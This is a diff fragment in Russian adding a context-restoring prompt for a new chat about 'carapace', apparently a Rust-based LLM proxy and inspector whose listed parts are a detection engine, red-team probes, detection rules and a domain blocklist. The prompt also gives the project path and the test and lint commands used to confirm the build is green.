+Если переходишь в новый чат и хочешь поднять контекст за 30 секунд, вставь туда следующий промпт:
 
-The next real bottleneck is no longer code.
+```
+Проект carapace — LLM-прокси/инспектор на Rust.
+Путь: C:\Users\anton\OneDrive\Рабочий стол\DebiForeverProfile\carapace
+Docs: прочитай carapace/README.md — там полная архитектура, команды, правило_adding_guide.
 
-It is **distribution**.
+Структура:
+- src/inspect.rs     — детекшн-движок v2 (DynamicRuleRegistry, SeverityTier, suppress)
+- src/probes.rs      — 30 red-team зондов
+- src/proxy.rs       — HTTP прокси (axum + hyper)
+- src/judge.rs       — парсер verdict из upstream
+- rules/default.json — 88 правил в 14 категориях
+- rules/blocklist.json — 7 IoC доменов
+
+Железо: regex crate НЕ поддерживает lookahead/lookbehind — все паттерны без (?!...).
+
+Проверка состояния:
+  cd <путь>\carapace
+  cargo test --quiet                                   # "test result: ok. 99 passed"
+  cargo clippy --all-targets -- -D warnings            # 0 warnings
+
+Сейчас всё зелёное. Что делаем дальше?
+```
+
+Этого хватит новому инстансу, чтобы сразу войти в курс дела. README содержит всё: архитектуру, список модулей, команды CLI, категорий правил, sécurité-инварианты и FAQ.
